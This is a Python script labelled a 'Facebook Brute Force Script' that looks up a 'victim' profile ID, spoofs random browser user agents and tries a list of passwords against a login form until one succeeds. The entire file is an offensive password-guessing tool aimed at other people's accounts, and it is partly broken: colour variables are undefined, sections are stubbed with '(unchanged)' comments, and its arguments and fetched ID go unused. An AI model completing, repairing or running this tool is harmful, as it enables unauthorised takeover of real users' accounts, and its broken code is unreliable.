import socket
import time
import os
import optparse
import random
import re
import requests
import mechanize
import argparse  # Add this line for argparse

# Colors (unchanged)

# Hosting Secure Connection (unchanged)

# Checking Proxy and Ports (unchanged)

# Choice Random User-Agent supporting browser (unchanged)
# Choice Random User-Agent supporting browser
def get_user_agent():
    useragents = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
        'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
        'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1'
    ]
    return random.choice(useragents)


# Fetching Victim Profile ID
def get_profile_id(url):
    try:
        id_re = re.compile('"entity_id":"([0-9]+)"')
        content = requests.get(url).content
        profile_id = id_re.findall(content)
        print(blue + "\n[" + wi + "*" + blue + "] Target Profile" + wi + " ID: " + yl + profile_id[0] + wi)
        return profile_id[0]  # Return the profile ID
    except IndexError:
        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victim Profile URL " + rd + "!!!" + wi)
        exit(1)

# Brute Force
def brute_force(url, profile_id, wordlist):  # Modify function parameters
    try:
        session = requests.Session()
        session.headers['User-Agent'] = get_user_agent()

        for password in wordlist:
            payload = {
                'email': 'your_email@example.com',
                'pass': password
            }
            response = session.post(url + profile_id, data=payload)

            if "Login failed" not in response.text:
                print(blue + "\n[" + wi + "*" + blue + "] Password Found:" + yl + f" {password}" + wi)
                break  # Exit the loop if the password is found

    except Exception as e:
        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + f" {e}" + rd + "!!!" + wi)
        exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Facebook Brute Force Script')
    parser.add_argument('-t', '--target-id', dest='profile_id', help='Target profile ID', required=True)
    parser.add_argument('-p', '--password-list', dest='wordlist', help='Password list file path', required=True)
    args = parser.parse_args()

    # Replace 'your_url' with the actual URL
    url = 'your_url'
    # Fetch the profile ID
    profile_id = get_profile_id(url)
    # Replace 'your_wordlist.txt' with the actual wordlist file path
    brute_force(url, args.profile_id, ['password1', 'password2', 'password3'])  # Replace with your custom wordlist
